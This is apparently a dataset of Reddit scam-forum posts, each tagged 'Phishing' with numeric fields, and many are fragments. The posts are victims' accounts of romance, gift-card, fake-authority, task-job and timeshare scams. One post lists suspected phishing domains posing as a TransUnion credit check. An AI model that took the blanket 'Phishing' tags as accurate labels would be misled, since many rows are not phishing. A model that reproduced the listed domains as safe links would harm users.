Right now, I'm refusing to pay and they are threatening to send me to collections. The state of California has consumer protection laws that specifically forbid this type of behavior. Unfortunately I signed the contract in Seattle, and as far as I can tell Washington doesn't explicitly forbid it. Now, I would argue that a contract that requires someone to pay thousands of dollars while receiving *absolutely nothing* would fit the definition of ""unconscionable"" in the legal sense. But, I'd have to file a lawsuit in Seattle's small claims court to find out. I'm honestly not sure how to proceed, so any suggestions are appreciated.",Phishing,5738,992,146,1

1689663207.0,Onvoy Landline Caller called to tell me he killed our cat.,"So almost a week ago, my sisters cat went missing during a thunderstorm. For two days now, we‚Äôve been posting all over and even put up a few flyers around the neighborhood with our contact numbers on it of course. 

Tonight at 12:06am so midnight, my sister (19) got a missed call and asked me to call it back and see if it was about her cat. 

I (21 F) called the number once, someone picked up then hung up. I called again, picked up then hung up. So I sent a text saying ‚ÄúHi, just calling to return a call I received earlier.‚Äù and they responded ‚ÄúNo you‚Äôre not, relax‚Äù I responded ‚ÄúSo you didn‚Äôt call the number ending in - - - -?‚Äù He goes ‚ÄúI did not.‚Äù In the process of texting I called again and he answers and goes ‚ÄúI was just calling about your cat to tell you he‚Äôs dead.‚Äù then hung up. I called again ‚Äúhow do you know?‚Äù and he goes ‚Äúbecause I killed him‚Äù then hung up. He wouldn‚Äôt answer me why, just kept texting me telling me to stop texting him. I texted back once more and begged him to tell me how he did it to my sisters cat and this time he calls me. My boyfriend answers and says ‚Äúhello.‚Äù Nobody answers so my boyfriend hangs up. He then proceeds to call back twice before I end up blocking him. 

It‚Äôs now 2:42am and I can‚Äôt sleep because now I can‚Äôt stop thinking about how someone killed our cat and how he did it. His tone of voice when he said ‚Äúhe‚Äôs dead‚Äù and ‚Äúi killed him‚Äù was so stern and scary it made my whole body go hot and made me wonder if it was even an accident or if was even true at all. 

I looked up the number on Spokeo, and even paid the 95¬¢ to see all of the information, the address is about 4.5 miles away from my house (first made me wonder if our cat would even go or get that far‚Ä¶) and then I seen that the phone was a landline and the carrier was Onvoy. My first initial thought was how can this person be texting me from a landline??? I then looked up what Onvoy because i‚Äôve never heard of it before and one of the first few posts was ‚ÄúOnvoy‚Ä¶landline call scam‚Äù or something like that. I was reading another post on reddit about them and how they thought they were talking to real people but not to tell them something morbid like their cat being dead. Our boy is so loving and affectionate he would come to you if you called him which only makes me sicker to think about if this is really the truth and our cat died in, with how the guy sounded, a horribly painful way‚Ä¶

Charity name is Impact lives hands of compassion.  The donations are given via western Union money transfer.

Apparently 1 of our church leaders and the charity owner started talking originally through some Christian/religious social media thing before he introduced him to the topic of his charity. The guy seems nice enough, he does calls/video calls, gives receipts of medical supplies etc bought for the children, invites church members to visit (although not really feasible for most of them).

Fast forward to today, I received a text that said ‚ÄúGolden1 Alerts: Your online banking has been locked due to unusual activity.

The asking for money was  a huge red flag and then I checker her name and found dozens of misspelled account names names and the one I was talking to was the Kiiana version.  
So I started baiting the the accounts and suddenly she was living all over the world.  
All they have is the same MO, making the victims fall in love an start asking for money using cash app or  bitcoin.  
And getting to the real girl is almost impossible, because everyone you ask seems to ne a sock of the scammers and lead you to her ""manager"" wo tells, if you wanna talk with my star it will cost you $500 ..  
Small porn TS girl only fans stars can hardly keep from financially drowning and for Only fans you don't need a manager..  


Is there anyone who knows of similar scams? and in particular around this girl?  
The real girl has nothing to do with it, and is as pissed as I am as I have learned,  


and the most irritating thing is, you can report them to twitter but they don't even have the option to report scams and they jus ignore the scammers

1679570504.0,Should we steal mums passport?,"Just hear me out...

I posted elsewhere but got zero answers so I searched for scams and found this sub so I'm asking here. I copied and pasted this from my other post but will add some more details at the bottom. This is a throwaway account because this situation is bonkers and easily identifiable.

A few weeks ago my mum (63) broke the news she has a Nigerian fiance. She had known him for 3 weeks at that point. She broke the news by showing the family a photo of him and saying 'This is my fiance, the only problem is, he's in Nigeria' (we live in the UK). They met on a language app and he is 36. Apparently he is dirt poor, so poor he has to live with his boss. But he has a smartphone and apparently a pretty decent data package judging by how much they facetime all over the place (like if he's on the bus or walking somewhere). 

My mum has very poor mobility, she struggles to walk, she can't walk without sticks and she can't do stairs very well either. She is very overweight and has a whole host of issues relating to this such as arthritis and fibromyalgia. 

She has booked a flight to Nigeria for next month, and this guy-remember, he is dirt poor-is suddenly getting an apartment, planning on renting a car for when mum is out there, and they're going to stay in a hotel because his apartment will have stairs.

The family is really very worried about her, she confessed to me that they were planning on getting married when she goes over there. Hopefully I put her off that by telling her that her mum would probably disinherit her if she does. My mum does not have money, I think she's used most of the last of her savings to book this flight. So it's not losing her money that we're all worried about, it's just that this is all ridiculously fast and while I know there is a slight chance this is genuine, I just can't believe that it is. We believe he's just using her to get citizenship to the UK or possibly something more sinister...

Last night my grandma rang me and asked if I knew where mum keeps her passport, she and my sister have been talking and they've decided we need to steal it a few days before she's due to fly so she has no time to get a replacement. My grandma has spoken to a friend of hers who has a Nigerian friend, and even the Nigerian friend has said this is without a doubt a scam, if my mum flies out there she will likely be held hostage and we will be asked to buy her back. 

My sister asked mum ""What do we do if you're kidnapped and we're asked for money?"" Mums response was ""He said that wouldn't happen, he'd stay with me at all times."" I don't think she realised my sister meant 'What if HE kidnaps her'.

Wtf do we do? Mum is going down to the Nigerian embassy today for something to do with her visa application. She flies in one month.",Phishing,2797,539,74,1

I thought I could lend a hand so he followed me to the nearest gas station where I filled up his tank. While filling up his tank he told me that he needed to get to California and that he was driving a rental and he needed money, around $500 for fuel and food to get there because his cards didn‚Äôt work in the US. He showed me his daughter, who was pleading as well, and his baby with his brother in the front seat and that he barely had any money to even buy formula for his baby. He pulled off his gold chain and a ring he said both were $5,000 and again I asked him if he had this much money why couldn‚Äôt he just trade them for cash, which I instant gave back because I just wanted to do something good, and he said that Americans wouldn‚Äôt be willing to work with him because he‚Äôs Arabic.

1641609191.0,I got scammed into stealing $6000 cash from my work place last night,"I know this is long but it‚Äôs insane and I‚Äôm really depressed 
I am a store manager for a small business with a few locations and last night at around 5:30pm half hour from closing I received a call to the store landline by someone impersonating my boss‚Äô brother. I know his brother works in the company as well and he sounded just like my boss so I believed it was him‚Ä¶ as soon as he told me what was happening I immediately freaked. He said his brother (my boss) was laundering counterfeit bills and one of my employees was an accomplice. He told me a US marshall was monitoring our call so I said put me on with him. So an entirely different man gets on the phone and gives me a badge number, phone number and lutenient name. I was told to go through every hundred dollar bill in the store and read off the serial numbers to check they are real. 
This dude knew things he shouldn‚Äôt have and was making it so personal and emotional. The marshall was so professional. They knew names of my employees I didn‚Äôt give, where things were in the store. They told me if I said anything to anyone I would be arrested for violating federal confidentiality. I was told if I hung up they would come to my house so I was on the phone for 5 hours shaking like a leaf under an evil spell that I was saving the company and the family. 
At one point I said I didn‚Äôt want to do this I want to go home I need proof and someone to come here and prove it, he said my boss would see the cameras and it would cause a scene and blow their cover. I drove around for 5 hours on the phone with this nasty freak with $6000 cash back and forth from the store to kroger dollar general walgreens etc that carries these things called MONEYPAK cards (so be aware of those people) and load the money on them then read him the pin number. I even broke a register at a kroger trying to take make too large of a transaction. 

I truly feel so ashamed and was told I was a victim by the police but I don‚Äôt know how to move past this. My boss was nice and kind of laughed it off yet was very concerned for my safety but I feel disgusting and sick and can‚Äôt help but feel they think I am the dumbest broad alive. I haven‚Äôt stopped shaking. They made me give them my social security number for proof thay the purchases matched (the stores took my ssn too) and photos of the front and back of my ID
Oh and the best part is they wanted to meet me at 5 in the morning for an ‚Äúaudit and drug test‚Äù I would have gone. My mom said I could be half way to Venezuela by now. When they got all the money and cards they wanted & I was finally able to hang up and go home I fainted in my car. When I came to I caved and called my parents and they called the police.

So yesterday I went to deliver pizza to a customer. It was a new customer and I have never delivered to the house before and when I knocked on the door the man who answered was elderly and said I didn‚Äôt order anything so I said oh OK I‚Äôm sorry and went back to my car and called the number on the receipt. A man answered and stated his whole name and it almost sounded like a robot at first, but then I started to hear a man with an Indian accent. It was almost as if he was using a voice changer to get rid of his accent, if that‚Äôs even a thing, or maybe it was just the cell connection making it sound strange 

I told him he must have given the wrong address because I knocked on the door and the person said they hadn‚Äôt ordered anything and he said no that‚Äôs the right address and he repeated it back with the area code and the area code was wrong which also made me suspicious. He said this is a surprise for my friend so I said oh OK because that does happen. Sometimes we will get a delivery and it‚Äôs for someone‚Äôs birthday and they don‚Äôt know that it‚Äôs coming. But the thing is this wasn‚Äôt paid for so I said that to him, and he says just put him on the phone you‚Äôll understand in a bit. 

So I go knock on the door again and the guy answers and I said hey so-and-so is on the phone they said that this is a surprise for you and he says oh yeah I know who that is so at this point he is on speaker phone and he says hey Paul it‚Äôs me, I remembered the other day you said you had been craving a pizza so I wanted to surprise you and send you one.  And he was very thankful but then the dude drops the bomb and says hey Paul, but do you think you‚Äôd be able to pay for this? And the guy says what? No I don‚Äôt think I‚Äôm going to be able to do that. So then the guy on the phone says to me is there a way to pay online? I said you could call the restaurant and pay with a credit card but I can‚Äôt handover the pizza yet. He says OK he will and tells Paul he‚Äôs gonna call him in a bit on this new number. 

I get back to the car and call my boss and tell him what‚Äôs going on and he says he hasn‚Äôt received a call yet to stay there, he calls me back and says he called him twice and he‚Äôs not answering Don‚Äôt give him the pizza. When I got back to the restaurant, he says he eventually got the guy on the phone and he said he was gonna call back with a credit card in 10 minutes and that‚Äôs when he said no I‚Äôm having my driver come back.

I went back to the guys door again at the end and explained what was happening and asked him how well he knew this guy and he said not that well and I said have you met him in person and he says no we‚Äôve only spoken over the phone about business deals and stuff, and I told him to be careful because this is most likely a scam, and not to give him any personal information or talk to him and he says you know what you‚Äôre probably right 

Have any of you guys come across anything similar to this? What I‚Äôm trying to figure out is what the endgame here would be. Only thing I can think of is it similar to the fake checks scam, this guy said they talked about business dealings so I was thinking he‚Äôs trying to get friendly with him over the phone. Send some food to seem nice and make it look like he‚Äôs an actual person, and then he says, let me front you 10,000 to get an investment going and then he ends up sending 20,000 tells Paul just to cash it and send the other 10 back and then the whole check bounces and he‚Äôs on the hook for all of it, basically a larger version of the fake check scam

One day, I get a letter from USAA saying I have an account with money and if I don‚Äôt claim it they‚Äôre sending it to the government. I remembered almost being scammed, but I didn‚Äôt think there was any way this money could be real, and thought maybe I was being scammed again. 

I called USAA (their number listed on google, not what was on the letter) and confirmed that yes, the money was most definitely real. 2 weeks later I had a check for $3,000 in my mailbox, which promptly went into a savings account. 

The whole time I‚Äôm thinking there‚Äôs no way this is real, I‚Äôm definitely being scammed, even after I had confirmed it was real with USAA- but nothing ever happened. The money stayed in my account, nobody reversed the check, and I never heard from fake job guy again. So I guess in a way I ended up playing the long con with a scammer!",Phishing,1611,313,35,1

I fought really hard with Wells Fargo, the bank I used Zelle through and even had screenshots of where they were misleading customers about zelle. I did everything I could including reporting to federal online bureaus.

 2 years ago I accepted that I lost the money and I beat myself up for it. I joined this subreddit to make sure it never happened again. Fast forward to today. I get a letter from WF addressing how my ""disputed Zelle payments required reevaluation and a refund was warranted"". I got a check for the full amount lost plus interest. I couldn't believe it. My guess is they are being forced to repay claims during a certain period. I'm glad this had a happy ending, but I sure did leanlrn a lot from it.

1693359072.0,Gift Cards for Puppies?,"I work as a bank teller and a woman I've never waited on before came in to withdraw $1000. She was excited because she was getting two new puppies from a breeder. I chatted with her and asked a few questions about the dogs, and it all seemed fine until I asked her how she wanted the cash back. She said it didn't matter since she was just buying gift cards anyway. I paused, confused, because maybe I misunderstood her. She very happily told me that oh yes, she was paying for the animals with two $500 gift cards.

Upon further questioning, she revealed that she hadn't actually seen the puppies in person but had seen a video of them. Oh, and they weren't local. The breeder lived a six hour drive away. But they were going to get the puppies to her as soon as she sent photos of the gift cards. I explained that this was a scam and she didn't seem to believe me. I talked her out of going thru with it but I think she just backed away because of my insistence. I decided to add a note to her account that she was potentially a victim of a gift card scam.

Lo and behold, two hours later, another teller at another branch called and asked for me. They wanted to let me know the lady came in to withdraw cash and the teller wanted more information from me. I explained. So I guess the woman mentioned the puppies but played dumb about the gift cards. In the end, the teller tried to explain she was being scammed. But we can't tell people what to do with their money so it was given to her. The other teller made note on the account about the transaction. 

A week later, the distraught woman goes into a third branch saying that her money was stolen from her and she wanted to dispute the transaction. Obviously she had no ground to stand on because she couldn't dispute that she made the withdraw. What happens after that is not our problem. The branch manager read the notes and saw that we tried to dissuade the woman. You just cannot reason with some people.",Phishing,1965,374,42,1

My nephew handed him the phone, unlocked, to make the call.
The guy made the call and took a few steps away, kind of pretended he was arguing with someone and was trying to get some privacy, and then, he handed my nephew back a phone, not HIS phone, A phone (a cheap old broken one) and the guy started walking away. It took my nephew a few seconds to realize what had happened. And then he started yelling after the guy and chasing after him but he was quite a few steps ahead by then. 
My nephew had one of those backpack leaf blowers on his back so the combination of a guy eight steps ahead and a leaf blower on his back that he had to take off to run after him, the guy was too far ahead and drove off.
The other night a woman approached me and asked if she could use my phone and I said ‚ÄúNo, but I‚Äôm happy to dial for you and out the person on speaker for you ‚Äú and she said ‚ÄúOh that would be fine‚Äù

After posting I received some really lovely, supportive messages and comments and I really appreciate that so much more than you know.

I didn‚Äôt talk about my situation much to the people in my life because I was so ashamed of being scammed, but it severely impacted my performance at my job and I eventually had to explain to my managers. They were very angry on my behalf and one of them is historically really good at resolving these types of situations. He, being an older adult man as well as having a commanding presence, rightly assumed they wouldn‚Äôt be so quick to brush him off compared to how they treated me. 

It took less than one full day from the time he agreed to help me for my money to be returned to my account. 

I wanted to update you because my story had a happy conclusion, but more importantly I wanted to stress how valuable standing up for yourself and having someone to advocate for you can be. I am a relatively young woman, who has a very hard time asserting herself, which makes me exactly the kind of person that people expect to give up and just let it go. And they‚Äôre right. If my coworker hadn‚Äôt offered to help, I would have never seen a penny back from that bank. 

If something like this happens to you, don‚Äôt back down. Fight it and escalate until you reach someone who will hear you out and if you aren‚Äôt capable of fighting, try to find someone who is willing to fight for you.

And you gain money by commission and its usually very low between 10-35 cents per task.
Everyday you have 3 sets of orders and each set has 40 tasks. 
There are things called ( super orders). 
It is a product that you earn 50√ó the commission of the normal product.

When you encounter one your balance will be in minus and you cannot proceed until you deposit money to get your balance to 0 then submit the super product. 
After you do the deposit and get your balance to 0 you will submit the super product and all the money you deposited will be back to your on screen balance.

Nothing dangerous or serious. My balance has fallen below 0 it was -243 so I deposited to get it to 0 then proceeded to optimize products.

He recently started going to seminars to start his own ‚Äúbusiness‚Äù where he finds people who can‚Äôt afford their existing mortgage, has them transfer it into a trust that he owns, he pays their mortgage monthly, they make payments to him over a period of time longer than their mortgage, then he will transfer the house back to them. So his business will be losing money until the mortgage is paid off, then it‚Äôd make money for the 5 or 10 additional years of payments he collects. He‚Äôs adamant that he‚Äôs helping people who can‚Äôt afford their homes or get a loan from the bank, but it seems pretty clear the way you make money on this is by waiting until someone misses a payment, then evicting them and keeping their house. I find this to be an immoral business, but I think I understand it.

Where things get confusing are when this guy starts talking about trusts. He is making a trust to put these houses into, so that the transfer of the house is allegedly not considered a sale. But he is then talking about how he needs to make sure his name, or his families names, are not on the trust so that it can‚Äôt be tracked back to him ‚Äúfor legal protection‚Äù. He will also be creating a second trust to put his house and cars into, which will also not have his name on it. We are having trouble getting information from him on what legal protection he thinks this is protecting himself against and why he needs this, but he just says vague things about banks and lawyers coming after him, potentially from his business pretending these homes are not being sold, or in case someone gets hurt in one of these houses and tries to sue him. He is currently in the process of putting the trust with his home and cars under the name of his pastor and the other trust under the name of someone he met at these seminars. He‚Äôs also talking about getting his drivers license address changed to ‚Äúa suite‚Äù so that his bank accounts associated with the trusts don‚Äôt have his address on them. Said something about a law passed after 9-11. 

Has anyone seen something like this before? It feels like he‚Äôs being taught to try to scam poor people while being set up as a mark himself. We‚Äôve told him we think this is immoral and sketchy, but he‚Äôs pushing through.

1697128748.0,Is this a scam? Dynasty Freight Systems email,"So I got an email a few weeks ago advertising for a ""Payment Processing Specialist"" from Ana Isabel at Dynasty Freight Systems. It seems to be a Canadian company based out of Regina, SK. I checked the website, but anyone can make a good looking fake website these days. 

I'm a little suspicious for a few reasons:

1. They emailed me directly and not through a job search website like indeed or linked in. Understandably I do have that email on my resume and my resume is available for viewing on those sites, so it's not hard to understand how they got my email, but I still find it strange they contacted me directly. 

2. I checked linked in and indeed and couldn't find anything for the company or the recruiter that reached out. I would think they would at least have a linked in account if they were a legit company looking to hire staff but I may be wrong.

3. I did a quick Google search of the company name and the word scam, and I saw a link that says the website was marked as suspicious. I also Googled the address of the company and I found a For Rent listing that was posted just 8 days ago. The most recent email was sent to me yesterday.

The third point is pretty convincing that it is in fact a scam, but it doesn't hurt to ask. Had anyone heard about this company? Or does this sound familiar to anyone?

1680481209.0,Art Scam Alert - Quarters on Red Bluff,"Hi everyone! I had recently seen a posting here about an Illustrator job with Trinity Insurance and Financial Consulting and about how it was a scam. Earlier this week, I had been communicating with that person and it seemed fishy. Upon researching it some more, my boyfriend found a Reddit posting about multiple people going through the same sketchiness that I did. With that in mind, I had been extra wary when applying to jobs. I‚Äôve been struggling to transition from teaching into the art world so when I got a legit looking email from Quarters on Red Bluff after filling out an application via LinkedIn (BOTH of these fake jobs were posted on LinkedIn and then deleted), I jumped at the chance. We set up a time to video call, as the person stated it would be via Skype. The company is in CST and I am in EST so we confirmed that the interview would take place at 5pm EST. At 5:10 I sent a quick email inquiring about the status of our interview (very politely!! I need a job lol) and was met with some ‚Äúoh so sorry, my bad‚Äù type responses. We didn‚Äôt end up starting on Skype until 5:35 EST (and it was all chat, no video, which was sketchy red flag 1.5). What entailed after that I can only describe as a complete waste of my time. I was shared a Word doc and given a half hour to complete it. It was legitimate questions about graphic design and myself as a designer. One of the questions asked about minimum income requirements. After filling it out and sending it back, they had me wait over Skype CHAT while they ‚Äúreviewed‚Äù my questions. Upon review 20 min later, they proceeded to say I was in, they offered me DOUBLE what I had asked for (red flag 2) and then stated they would send a check my way.

1682558010.0,BEWARE VERIZON SCAM,"My good friend is a UPS driver and they came across a scam today on their route I wanted to share with you all. 


There was a phone being delivered to a residential address and before they even got to the address, a man approached the truck asking if there was a package for a certain address. 

My friend, the UPS driver, did indeed have a package for that address. Per protocol, they asked to see this man's license. 

Instantly, my friend was suspicious because a) the license had no watermark and looked fake and b) the package itself  (a phone from Verizon) was addressed to an name that was Indian. The man in front of him looked most likely Hispanic. 

So our dear Driver says ""sorry I can't hand you the package now, I must deliver it to the address.""

The guy is pausing, asking the driver to call their boss, asking what time they will be around. Driver finesses all the questions. 

Makes their way to the address, and a woman answers the door. The driver tells her that next time she orders a phone, she should have it shipped to the store for pickup and confirms with her that yes, she does have a husband but it did not match the description flagging the truck down and asking for the package. 

Our friend, the driver, calls their supervisor and the supervisor confirmed that this is an inside job. Basically, someone at Verizon is tracking the phones that are being ordered. Someone is going through the trouble of printing a fake ID and via Verizon, has the tracking # for the phones.

Tl, Dr: Inside job being done at Verizon for people ordering new phones shipped to their house. They are printing fake ids and have a tracking # and are stopping UPS drivers en route to try to pick up the packages before they reach the residence and are potentially scouting these houses to get your phones before you do.

Edit: Thanks for everyone adding their experiences and I just want to clarify that we have some commenters claiming to be former Verizon employees, some saying this is not possible from Verizon's end and may or may not be part of a 3rd party scam. Some saying it is someone who may or may not be working for the company but has access to customer info/ email and it snowballs from there. 

Either way, I hope phone companies can come up with some better methods for new  phone deliveries that are more secure for the customer. But as for me, all phone companies can kiss my ass üòí",Phishing,2406,441,45,1
1668057944.0,A possible scam attempt that happened to my mom at an ugent care center,"My mother had this happen to her and asked me how to go about reporting it. Yesterday she went to an urgent care center she's been to several times before, and the receptionist was being extremely sketchy - telling my mom she thought her medicaid card was fake (its not) and to give her her SSN. My mom refused because she knows that's not something you have to give.

After a bit of back and forth my mom goes to the waiting room when she gets a phone call from someone who says they have questions about how she is using medicaid. My mom says they never call you, they send letters, so she demands to know who is calling and why. Guy on phone hangs up. She goes back to the receptionist and says someone called her about it, and now the receptionist woman looks nervous but plays dumb.

Mom isn't sure reporting the incident to the urgent care will be enough, how else to go about reporting this incident? She figures the woman working there is trying to scam people who don't know any better.

1697293437.0,The Semi-Innocuous Travel Scam,"Was in India several years ago. Cab drivers compete for western tourists (or anyone they think has money I guess)....

We talked to a guy by all the cabs in a transportation hub in Mumbai... Thought he was a driver but he found somebody else for us after talking a few minutes.

We just wanted someone to take us to a few places / sites over a few hours. Had also lost some luggage and needed to find a place to buy some clothes. The cab driver agreed. Idk if they did it intentionally, but a lot of the drivers and people spoke English and the guy we ended up with didn't speak English very well at all. I think they wanted something like $10 for him to drive us for about 3-4 hours time. 

So... We take off and this driver proceeds to take us to several high end art and clothing business in the area. The first few we obliged and walked around the stores. The stuff was all comparable to basically shopping in Paris or New York ritzy areas.... We didn't have the money for anything like that, but I told my wife I figured the driver was getting kickbacks to take us to certain places.

I'm pointing to places on maps and saying names of places I know he's familiar with and he seems to get it... Then we end up somewhere else not on the agenda.

After about 2 hours it became clear the driver was only going to take us to places he wanted to go and we paid the guy $15 or so for the time and had him drop us off. He seemed surprised.

Thing is, I would have paid the guy $50-100 as a tip on top of the $10 for driving us to see what we actually wanted to see. The stuff in the stores he took us to was waaay out of our range, but $50-100 for a few hours of driving and waiting would have been very reasonable in my opinion.

Most of the time we were on foot or in the little golf cart cabs that fill the streets honking incessantly at other cars while completely ignoring the 2 ton longhorn in the middle of the road with the 6' horn span. We weren't dressed up nice. I guess they just thought since we came to India from the US we had money. We really just got to go because a friend got us 90% off on the flight. (On a side note about misconceptions about westerners... Shared a train cab between Mumbai and Agra with a local who was baffled that I'm from the US but don't personally know Will Smith, lol).

It didn't really cost us much but a few hours, and we learned a bit about how things work with cabs in the cities in some places.

So the first thing I did was to contact them and have a consultation with a science bro whose job it is to make me feel really positive and like it's really affordable, he basically said to me here's everything you will need, the trt the estrogen blockers and the pills that keep your testicles healthy and full and then rounded it off by saying the whole thing would be $299 with an additional 50 bucks per month for the medication, sounds doable right?

Well, after I had my blood work done and had my consultation with the nurse and got my recommendations via an email I had another conversation with him where he said sorry for the confusion of which there was none, he claimed the $50 a month was actually $50 a week, then from there ended the phone call and said I will send you an email with the full spec of everything you need, with the pricing next to it.. lo and behold, everything had a price next to it of around $375 there were at least six different things of which you needed three to move forward, it turned out to be even with just a hormone replacement therapy starter kit which is supposed to only be for 10 weeks and boost your trt levels,.. 308 bucks a week!! For 10 weeks... so $299 to walk in the door and then $308 all set and told for 10 weeks and this isn't even mentioning the vitamin deficiencies I had vitamin D Etc when I live in Florida which I found very odd... so you can expect to spend about 3 Grand on a starter kit for hormone replacement therapy and unless you're very wealthy I wouldn't even attempt trt as that's pretty much for life, so the reality is if you make less than 100 Grand a year you're pretty much not going to be able to afford it in the long run.",Phishing,2046,393,47,1

I was asked 245‚Ç¨ other people were asked 1000‚Ç¨. Inconsistent. 

The twist is that in some cases (30% Id say) they actually grant the visa ONLY after you have paid these additional fees.

I dont know, if this belongs here, but please tell me where I can get help, if not. Thanks

A good friend of mine got scammed by a girl from Turkey/Romania. He saw her once during a short vacation. 

She was shortly to fly over, and he even bought her a ticket, which she missed for some visa reasons. It was a lie, since she told him she has to prove to the german toll, that she has enough money to make vacation in Germany. So he sent her almost 2.000‚Ç¨ via bank transfer and 500‚Ç¨ via WesternUnion.

Because of buying her a ticket, she sent him her ID and banking details, where the money arrived at the end via SEPA.

So I assume we have her real name and know how she looks like, since they videophoned a lot as well. 

Since I am not familiar on how to proceed from there, what can I do to help or even get the Bank and even police involved?

For those who may not know here is how the scam works: 

They come up to you in a parking lot usually and tell you they have an extra something in the trunk. They will look and act official like they are part of a company or something.

 Could be a TV, stero system, or apparently a home theater. It's usually electronics but doesn't have to be.

Then they will show you a ""retail price"" for the item and make it out like they are cutting you a deal. 

Really the product is either broken or cheap AF and you'll actually end up paying more than it's worth. Or it's stolen goods.

Or Did I get scammed?","*TLDR: Wife and I won a ""free"" vacation that is basically a 1-night stay to then listen to a timeshare presentation. I already gave them a deposit (via credit card) that is only refundable after I sit through the presentation. I realized it was a shady scam after I already gave deposit. Do I call my credit card company and do a chargeback, or do I stay the ""free"" night and sit through the presentation to get my deposit back? I already know I'm not buying a timeshare and there's nothing they can say to change my mind.*

Full Story:

My wife and I went to a county-fair-type event this weekend, and when we got there we're automatically entered into a raffle to win gift cards, vacations, etc. Low and behold, I get a call saying that we won a $200 gift card and a ""free"" night at a resort from the same raffle.

""Cool!"", I think to myself. I'm on the phone with them, but my natural scam radar is pinging, so I Google the name of the company they're with and their phone number. All come back on Google as valid. The number I'm calling is the real number for the hotel, their website is legit, and they have Facebook page with a decent amount of followers.

They ask for a refundable deposit of $129, which should have been red flag #1, but I figured that if it was a scam and they stole my credit card, I can file a fraudulent charge with my credit card company and get my money back.

After I give them my card, THEN they tell me that I must attend a 2 hour presentation about their vacation packages. It was at that moment, I realized that I screwed up. After further Googling, I found out that while they are a legit company, they basically give away these ""getaways"" as a way to sucker unsuspecting people into buying the epitome of legal scams: TIMESHARES.

Stories all over the internet say that these ""presentations"" are super aggressive sales pitches where they basically pester you until you crack. Some people, however, have had success sitting through these presentations and have collected their $200 gift card and their original deposit (as promised) by sitting through the 2 hour presentation and setting a hard stop timer on their phones.

I can say with confidence that I'm not getting suckered into buying anything, but the whole situation has gotten me unnerved about what else they can try to pull. Honestly, I would rather just get my money back without going to this thing, but on the invoice they sent me, it clearly states that the reservation is not refundable until I've sat through the presentation. Go figure.

My question is, do I call my credit card company and attempt to get a chargeback, which risks them claiming that I'm cancelling my reservation after I already agreed to give them a deposit, or do I go to the presentation and collect the $200 gift card + my original deposit. Has anyone had success with the first (chargeback) option? Any advice, especially based on a real-life experience with this kind of thing, is greatly appreciated!",Phishing,2981,536,76,1

I also apologize for my poor formatting, as I don‚Äôt use reddit enough to understand how to make posts look good. Either way, PLEASE help me. I am so scared.


For the past few months, I‚Äôve been trying to get an apartment. I don‚Äôt exactly have any credit (that‚Äôs an even longer story), so it has been a little hard for me to land a place. A month ago, as I was looking around on Zillow, I found a place that looked good and like the many others I sent them a tour request.

The ‚Äúowner‚Äù, a person who called their self ‚ÄúSofie‚Äù,  wrote back to me in this fashion: (See image labeled as ‚Äú1‚Äù)

After that text, they told me they wanted to send me a link to check my credit. I gave them my email, to which they send me a link that, after crossing over a few URLs, took me to a transunion page where I filled out my info such as name, address, last 4 social digits, birthday, etc. 
(See images ‚Äú2.‚Äù And ‚Äú3.‚Äù)

I tried to explain that I didn‚Äôt have any credit, and they said they wanted to see my credit score anyway. I assumed it was to make sure I wasn‚Äôt lying in order to hide bad credit or something. 

I got my credit score (which was literally blank because I don‚Äôt have credit), sent them a screen shot, and they stopped responding to me. 


A month later, I‚Äôm still looking for rentals when I find another place. I shoot them a tour request, and they text me. I get a text from the same number as ‚ÄúSofie‚Äù but this time they are calling their self ‚ÄúGenna‚Äù. I thought this was from a Zillow number or something like that, so I engaged for a minute. It wasn‚Äôt long before I realized that ‚ÄúGenna‚Äù texted exactly the same as ‚ÄúSofie‚Äù. (See image ‚Äú4.‚Äù)


I realized quickly that this was some kind of scam, and that‚Äôs where the panic set in which is what has brought me here to reddit. I once again got an email from ‚ÄúGenna‚Äù, who in the same stylings as ‚ÄúSofie‚Äù, send me the same trans union link to check my credit score. 
(See Image ‚Äú5.‚Äù) 

I took note of all of the URLS that the link crossed over to bring me to the trans union page to post them here for analysis. 
(see images ‚Äú6.‚Äù to ‚Äú8.‚Äù)

The URLS are
your-creditscore.com
afflat3a1.com
transunion.ifgza3.net 
then it takes me to the actual page with the credit report form.

I quickly went back to the link that ‚ÄúSofie‚Äù had sent me, and when I clicked on it this came up:
(see image ‚Äú9.‚Äù)



So, with all of that being said, I am here to ask if I had filled out a fake trans union form a month ago for ‚ÄúSofie‚Äù? Could they have actually seen all of the sensitive info I had put down? I did have to register and pay a fee, which I do now get official emails from trans union as a result. Is there some way I could find out if my SSN or other aspects of my identity have been compromised?

Your snarky comment might just be the thing that pushes that person to end it all. You never know how much damage you can do in these situations with a stupid comment. You got nothing to gain other than making a person in a low point feel even worse. You're only worsening it. 

Scammers don't prey on the stupid, they prey on the innocent, the ignorant, the good hearted people, the people that desperately need something the scammers are making them believe they will get, only to take everything they can out of them. That's really messed up, and so is just insulting, making fun of and blaming the victim of these scumbags. If you're not going to help, just please don't make it worse!

Edit: Ok so a few people here are arguing that scammers do target (what you consider) stupid people. You can also say that kids are stupid and so they easily fall for people with bad intentions. That doesn't make it right to insult them when they do. Even by that standard, if you consider that these persons are stupid, meaning they don't have the intelligence nor the capacity to see through deceptions and lies, it's even worse, because you're just insulting, blaming and laughing at someone that didn't even have a chance. You might consider you are way smarter, but if you're here commenting these kinds of things to scammer victims, consider this too: you may be smart but you're also a pretty crappy person.",Phishing,2112,380,53,1

I blocked the email, and am disappointed with myself for falling for such a scam and reaching out with my personal email.

I know it was probably just a scam, and maybe I'll get more phishing emails as a result, but part of me also worries if the images he sent were malware or something. I did a fullscan on my PC and there was nothing. Gmail didn't flag the images as dangerous, but they were still loaded in (both on PC and my ios mail app).  if anyone could provide some reassurance or advice that would be greatly appreciated as I am still slightly paranoid (it has been a week or so and I'm not seeing anything suspicious in terms of email activity and I've already changed passwords just in case as well).

1687659598.0,"Scammed for entire life/retirement savings, looking for advice","Hi, first time posting but in need of some help! Any input is greatly appreciated.

Never thought that this would happen to someone so close to me, but I just received a frantic call from my mom this morning that my dad lost their entire life/retirement savings. 

